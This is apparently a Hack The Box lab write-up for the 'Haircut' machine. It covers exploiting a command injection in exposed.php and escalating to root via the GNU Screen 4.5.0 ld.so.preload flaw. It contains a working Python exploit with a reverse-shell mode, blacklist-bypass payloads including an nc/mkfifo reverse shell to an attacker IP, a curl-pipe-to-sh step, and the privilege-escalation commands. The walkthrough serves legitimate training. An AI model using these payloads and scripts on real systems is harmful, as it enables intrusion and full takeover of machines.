---
title: 'HTB Haircut - Medium'
date: 2024-05-28 17:00:00 +0000
categories: [HTB Machines]
tags: [Medium, Linux, HTB]
---

**Haircut** is a medium HTB machine where you need to enumerate a web server to discover an **exposed PHP file** that is **vulnerable to command injection**. You must **bypass blacklist filters** to establish a reverse shell and gain a foothold. Subsequently, root-level access to the machine can be achieved by **exploiting a screen privilege escalation CVE**.

**Note**: As I mentioned during this walkthrough, it would be highly beneficial to complete the Command Injection module from HTB Academy if you don't know about command obfuscation and you want to learn more about it.

<img src="/assets/img/haircut/Untitled.png" alt="Untitled.png" style="width:600px;">

# Reconnaissance

Started with an Nmap scan with [nmap4lazy](https://github.com/duskb1t/nmap4lazy), a simple script I created.

```bash
sudo python3 ~/Desktop/tools/nmap4lazy/nmap4lazy.py -t 10.129.224.34

[+] Scanning all TCP ports...

[+] Command being used:

/usr/bin/nmap 10.129.224.34 -p- -sS -Pn -n --min-rate 5000

[+] Open ports: 

22, 80

[+] NSE Scan in process. This might take a while...

[+] Command being used:

/usr/bin/nmap 10.129.224.34 -sVC -p22,80

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-28 15:49 WEST
Nmap scan report for 10.129.224.34
Host is up (0.059s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 (RSA)
|   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 (ECDSA)
|_  256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 (ED25519)
80/tcp open  http    nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title:  HTB Hairdresser 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.05 seconds

[+] Script finished successfully
```

This… web page ¿?¿? received us on port TCP/80.

<img src="/assets/img/haircut/Untitled 1.png" alt="Untitled 1.png" style="width:800px;">

Discovered an /uploads directory with [Feroxbuster](https://github.com/epi052/feroxbuster).

```bash
feroxbuster --url http://10.129.224.34/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt -C 404
200      GET      286l     1220w   226984c http://10.129.224.34/bounce.jpg
200      GET        7l       15w      144c http://10.129.224.34/index.html
301      GET        7l       13w      194c http://10.129.224.34/uploads => http://10.129.224.34/uploads/
```

Directory indexing is not allowed.

<img src="/assets/img/haircut/Untitled 2.png" alt="Untitled 2.png" style="width:800px;">

There has to be a file upload functionality somewhere. Fuzzing for PHP files with a larger wordlist led us to discover an ‘exposed.php’ file.

```bash
feroxbuster --url http://10.129.224.34/ --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt  -C 404 -x php
301      GET        7l       13w      194c http://10.129.224.34/uploads => http://10.129.224.34/uploads/
200      GET      286l     1220w   226984c http://10.129.224.34/bounce.jpg
403      GET        7l       11w      178c http://10.129.224.34/uploads/
200      GET       19l       41w      446c http://10.129.224.34/exposed.php
```

The PHP file appears to serve a web checking functionality.

<img src="/assets/img/haircut/Untitled 3.png" alt="Untitled 3.png" style="width:800px;">

# Exploitation

There is a character blacklist in place, so let’s operate with Burp.

```
http://localhost; $(whoami)
```

<img src="/assets/img/haircut/Untitled 4.png" alt="Untitled 4.png" style="width:800px;">

Successfully achieved RCE by prepending %0a.

```
formurl=http%3A%2F%2Flocalhost%0awhoami&submit=Go
```

<img src="/assets/img/haircut/Untitled 5.png" alt="Untitled 5.png" style="width:800px;">

Trying to establish a reverse shell does not work. Semicolons are not the only blacklisted character. In fact, there are multiple commands blocked but we can easily enumerate them from the server response :D.

```
formurl=http%3A%2F%2Flocalhost%0arm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.14.42%204444%20%3E%2Ftmp%2Ff&submit=Go
```

<img src="/assets/img/haircut/Untitled 6.png" alt="Untitled 6.png" style="width:800px;">

After some testing, here is the PoC script that I created.

```python
import argparse
import requests
import sys

def inject_command(target, command):
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    url = f'http://{target}/exposed.php'
    data = f'formurl=http%3A%2F%2Flocalhost%0a{command}&submit=Go'

    print(f'\n[+] Command injected: {command}')
    response = requests.post(url, headers=headers, data=data, timeout=2)

    # alert: the following python code could cause elipepsy
    if '$@' not in command:
        list_from_output = response.text.split('\n')
        previous_line = list(filter(lambda x: '<center>' in x.strip(), list_from_output[::-1]))[0]
        start_index = list_from_output.index(previous_line) + 1
        command_output = '\n'.join(map(lambda x: x.strip(), list_from_output[start_index:-5]))
    
        print(f'\n[+] Output:\n\n{command_output}')
    
def send_revshell(lhost, lport, target):
    try:
        command = f'n$@c%09-c%09sh%09{lhost}%09{lport}'
        inject_command(target, command)

        raise Exception("\n[!] Error: Could NOT establish a reverse shell :(")

    except requests.Timeout:
        print("\n[+] Check your Netcat listener :D")

def set_arguments():
    parser = argparse.ArgumentParser(
        description="HTB Haircut exploit"
    )
    parser.add_argument('-t', '--target', dest='target', required=True)
    parser.add_argument('-m','--mode', dest='mode', choices=['c', 'r'], required=True)
    parser.add_argument('--command', dest='command')
    parser.add_argument('--lhost', dest='lhost')
    parser.add_argument('--lport', dest='lport', default=4444, type=int)
    
    return parser.parse_args()

def main():
    try:
        args = set_arguments()

        # reverse shell mode
        if args.mode == 'r':
            send_revshell(args.lhost, args.lport, args.target)

        # command injection mode
        elif args.mode == 'c':
            inject_command(args.target, args.command)

        sys.exit(0)

    except KeyboardInterrupt:
        print("\n[!] Keyboard interrumpt detected. Quitting!")
        sys.exit(1)

    except Exception as e:
        print(e)
           
main()
```

The `-m c --command <command>` flags allow us to remotely execute commands as www-data.

```bash
python3 haircut.py -t 10.129.224.34 -m c --command "whoami" 

[+] Command injected: whoami

[+] Output:

www-data

python3 haircut.py -t 10.129.224.34 -m c --command "ls -lah"

[+] Command injected: ls -lah

[+] Output:

total 444K
drwxr-xr-x 3 root     root     4.0K May 19  2017 .
drwxr-xr-x 3 root     root     4.0K May 16  2017 ..
-rwxr-xr-x 1 root     root     114K May 15  2017 bounce.jpg
-rwxr-xr-x 1 root     root     164K May 15  2017 carrie.jpg
-rwxr-xr-x 1 root     root      921 May 15  2017 exposed.php
-rwxr-xr-x 1 root     root      141 May 15  2017 hair.html
-rwxr-xr-x 1 root     root      144 May 15  2017 index.html
-rwxr-xr-x 1 root     root     133K May 15  2017 sea.jpg
-rwxr-xr-x 1 root     root      223 May 15  2017 test.html
drwxr-xr-x 2 www-data www-data 4.0K May 22  2017 uploads
```

But let’s simply start a Netcat listener `nc -nlvp 4444` and send a reverse shell with the `-m r` flag.

```bash
python3 haircut.py -t 10.129.224.34 -m r --lhost 10.10.14.42

[+] Command injected: n$@c%09-c%09sh%0910.10.14.42%094444

[+] Check your Netcat listener :D
```

**Note**: Other command bypasses would be `n'c'` and `n\c`. If you want to learn about command obfuscation I highly recommend you the Command Injection module from HTB Academy :D.

Successfully established a reverse shell as www-data, transforming it into a pseudo-interactive TTY with Python.

```bash
www-data@haircut:~/html$ whoami
www-data

www-data@haircut:~/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# PrivEsc

There is another user called ‘maria’.

```bash
www-data@haircut:~/html$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
maria:x:1000:1000:maria,,,:/home/maria:/bin/bash
```

Executed [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) to discover potential PE vectors.

```bash
www-data@haircut:~/html$ curl 10.10.14.42/linpeas.sh|sh
[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154
```

The screen 4.5.0 PE ended up working. You can use this one from EDB to follow the steps.

```bash
searchsploit screen 4.5.0                                          
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
GNU Screen 4.5.0 - Local Privilege Escalation                                                                                                              | linux/local/41154.sh
```

First, we need to compile the shared object library and the binary in our VM.

```bash
gcc -fPIC -shared -ldl -o libhax.so libhax.c

gcc -o rootshell rootshell.c -static
```

Transferred both of them to the target box and executed the rest of the PoC script.

```bash
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
echo "[+] Triggering..."
screen -ls
/tmp/rootshell
```

Successfully escalated to root and read both flags. GGs!

```
# whoami
root

# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)

# cat /root/root.txt
e8ef50cbafb79eae****************

# cat /home/maria/user.txt
a92b63c644967cc8****************
```